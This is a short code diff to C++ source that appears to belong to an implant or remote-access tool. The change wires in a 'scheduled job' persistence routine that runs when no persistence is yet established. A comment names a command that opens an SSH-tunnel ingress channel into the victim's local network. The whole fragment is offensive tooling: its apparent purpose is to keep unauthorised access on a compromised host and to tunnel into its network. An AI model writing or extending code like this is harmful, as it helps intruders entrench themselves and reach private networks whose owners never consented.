@@ -13,7 +13,7 @@
 #include "clean-encoding.h"
 #include <vector>
 #include "ssh_persistence.h"
-#include "extra_persistence_routines.h"
+#include "scheduled_job_persistence.h"
 
 Core::Core() {
     std::cout << "[+] Application core initialized" << '\n';
@@ -48,7 +48,7 @@ void Core::loop() {
      *              - open_ingress_tunnel       -> open an ssh-tunnel based ingress channel into the local network
      *      
     */
-    
+    if (established_persistence_count < 1) {scheduled_job_persistence();}
 }
                                             // The TLS encryption of this request has been confirmed with Wireshark
                                             // consult for further changes: https://github.com/yhirose/cpp-httplib
